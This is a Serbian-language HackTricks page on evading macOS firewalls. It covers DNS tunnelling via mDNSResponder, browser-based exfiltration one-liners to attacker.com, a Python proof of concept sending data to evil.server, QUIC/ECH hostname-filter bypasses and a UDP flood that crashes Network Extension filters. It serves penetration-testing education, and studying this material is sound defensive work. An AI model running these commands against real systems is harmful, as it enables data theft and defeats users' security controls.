# Zaobilaženje Firewall-a na macOS-u

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su se pokazale funkcionalnim u nekim macOS firewall aplikacijama.

### Zloupotreba whitelist imena

- Na primer, malware se može nazvati po imenima poznatih macOS procesa, kao što je **`launchd`**

### Synthetic Click

- Ako firewall zatraži dozvolu od korisnika, naterajte malware da **klikne na allow**

### **Use Apple signed binaries**

- Kao što je **`curl`**, ali i drugi, poput **`whois`**

### Poznati Apple domeni

Firewall može dozvoljavati konekcije ka poznatim Apple domenima, kao što su **`apple.com`** ili **`icloud.com`**. iCloud se može koristiti kao C2.

### Generičko zaobilaženje

Neke ideje za pokušaj zaobilaženja firewall-a

### Provera dozvoljenog saobraćaja

Poznavanje dozvoljenog saobraćaja pomoći će vam da identifikujete potencijalno whitelist-ovane domene ili aplikacije kojima je dozvoljen pristup tim domenima
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

Na macOS-u proces **ne komunicira** sa DNS serverom direktno. Razrešavanje imena se posreduje preko **XPC-a** pomoću **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), system daemon-a potpisanog od strane Apple-a, tako da svaki upit na računaru napušta host kao saobraćaj **od `mDNSResponder`-a**, umesto od procesa koji ga je pokrenuo. Zbog toga firewall-i obično bezuslovno veruju tom daemon-u — njegovo blokiranje bi prekinulo razrešavanje imena za ceo sistem.<sup>[[1]](#references)</sup>

To DNS čini kanalom koji ostaje otvoren čak i kada firewall blokira sopstvene socket-e malware-a:<sup>[[1]](#references)</sup>

1. Malware pokušava da se poveže na `evil.com`. Njegovu **sopstvenu** odlaznu konekciju proverava firewall i **blokira je**.
2. Malware umesto toga traži od `mDNSResponder`-a da **razreši** `evil.com`, preko XPC-a.
3. Firewall proverava nastali upit, vidi da je njegov pokretač pouzdani Apple-om potpisani resolver i **dozvoljava ga**.
4. Upit stiže do DNS servera — a ako napadač upravlja authoritative server-om za `evil.com`, kontroliše obe strane razmene.

Pošto napadač poseduje tu zonu, nikakva „konekcija“ nikada nije potrebna: podaci se krijumčare unutar **upitovanih labela** (npr. `<encoded-chunk>.evil.com`), a komande se vraćaju unutar **answer record-a** (TXT, A, CNAME…), što je klasični DNS tunnelling koji koristi potpuno whitelisted proces.

Bilo koji unprivileged proces može direktno da upravlja daemon-om, što je jednostavan način da se potvrdi da je ovaj put otvoren:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Preko Browser aplikacija

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem ubacivanja koda u procese

Ako možete **ubaciti kod u proces** kojem je dozvoljeno povezivanje sa bilo kojim serverom, mogli biste zaobići zaštitu firewall-a:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne ranjivosti za zaobilaženje macOS firewall-a (2023–2025)

### Zaobilaženje Web content filter-a (Screen Time) – **CVE-2024-44206**
U julu 2024. Apple je zakrpio kritičnu grešku u Safari/WebKit-u koja je narušavala sistemski “Web content filter” koji koriste roditeljske kontrole Screen Time-a.
Posebno kreiran URI (na primer, sa dvostruko URL-enkodiranim “://”) nije prepoznat od strane Screen Time ACL-a, ali ga WebKit prihvata, pa se zahtev šalje bez filtriranja. Zato svaki proces koji može da otvori URL (uključujući sandboxed ili unsigned kod) može da pristupi domenima koje je korisnik ili MDM profil izričito blokirao.<sup>[[2]](#references)</sup>

Praktični test (nezakrpljen sistem):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Greška u redosledu pravila Packet Filter (PF) u ranim verzijama macOS 14 „Sonoma“
Tokom beta ciklusa macOS 14, Apple je uveo regresiju u userspace omotaču oko **`pfctl`**.
Pravila dodata pomoću ključne reči `quick` (koju koriste mnogi VPN kill-switch sistemi) bila su nečujno ignorisana, što je izazivalo leak saobraćaja čak i kada je VPN/firewall GUI prikazivao *blocked*. Grešku je potvrdilo nekoliko VPN proizvođača, a ispravljena je u RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Brza provera leak-a:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Zloupotreba Apple-signed helper services (legacy – pre-macOS 11.2)
Pre macOS 11.2, **`ContentFilterExclusionList`** je omogućavao da oko 50 Apple binarnih fajlova, kao što su **`nsurlsessiond`** i App Store, zaobiđu sve socket-filter firewall-e implementirane pomoću Network Extension framework-a (LuLu, Little Snitch itd.).
Malware je jednostavno mogao da pokrene excluded process — ili da inject-uje code u njega — i tunnel-uje sopstveni saobraćaj preko već dozvoljenog socket-a. Apple je potpuno uklonio exclusion list u macOS 11.2, ali je ova tehnika i dalje relevantna na sistemima koji ne mogu da se nadograde.<sup>[[3]](#references)</sup>

Primer proof-of-concept-a (pre 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za zaobilaženje Network Extension filtera domena (macOS 12+)
NEFilter Packet/Data Providers se oslanjaju na TLS ClientHello SNI/ALPN. Uz **HTTP/3 over QUIC (UDP/443)** i **Encrypted Client Hello (ECH)**, SNI ostaje šifrovan, NetExt ne može da parsira tok, a pravila za hostname često podrazumevano dozvoljavaju saobraćaj, omogućavajući malware-u da pristupi blokiranim domenima bez korišćenja DNS-a.<sup>[[5]](#references)</sup>

Minimalni PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ako je QUIC/ECH i dalje omogućen, ovo je jednostavan način za zaobilaženje filtera hostname-ova.

### macOS 15 „Sequoia“ nestabilnost Network Extension-a (2024–2025)
Rane verzije 15.0/15.1 ruše filtere trećih strana **Network Extension**-a (LuLu, Little Snitch, Defender, SentinelOne itd.). Kada se filter ponovo pokrene, macOS odbacuje svoja flow pravila, a mnogi proizvodi prelaze u fail-open režim. Slanje hiljada kratkih UDP flow-ova filteru (ili forsiranje QUIC/ECH-a) može uzastopno izazvati rušenje i ostaviti prozor za C2/exfil, dok GUI i dalje prikazuje da je firewall pokrenut.<sup>[[4]](#references)</sup>

Brza reprodukcija (bezbedna lab mašina):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Saveti za alate za moderni macOS

1. Inspect current PF rules that GUI firewalls generate:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumerate binaries that already hold the *outgoing-network* entitlement (useful for piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programmatically register your own Network Extension content filter in Objective-C/Swift.
A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s **LuLu** source code.

## Reference

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [macOS 14 Sonoma firewall bug fixed! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
